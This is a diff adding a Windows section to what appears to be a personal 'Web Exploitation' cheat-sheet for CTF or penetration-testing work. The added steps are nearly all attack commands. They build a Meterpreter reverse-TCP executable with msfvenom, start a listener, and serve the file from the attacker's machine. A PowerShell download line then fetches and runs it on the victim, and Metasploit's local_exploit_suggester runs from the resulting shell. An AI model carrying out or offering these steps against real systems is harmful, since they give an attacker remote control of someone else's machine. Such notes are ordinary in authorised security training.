@@ -1,5 +1,22 @@
 # Web Exploitation
 
+## local_exploit_suggester (windows)
+
+1. Have access to the victim machine terminal
+2. msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<ip, different from shell listener> -f exe > shell.exe # Generate a shell exe
+3. msfconsole
+4. > use multi/handler
+5. > set payload windows/meterpreter/reverse_tcp
+6. > set lhost tun0
+7. > set lport <ip, different from shell listener>
+8. > exploit
+9. python -m http.server <python port> # host python server on local for receiving the shell.exe from step 2
+10. powershell "(new-object System.Net.WebClient).Downloadfile('http://<ip>:<python port>/shell.exe', 'shell.exe')" # from windows machine
+11. .\shell.exe
+12. run post/multi/recon/local_exploit_suggester # from meterpreter
+
+
+
 ## Deobfuscate JS code
 https://matthewfl.com/unPacker.html
 
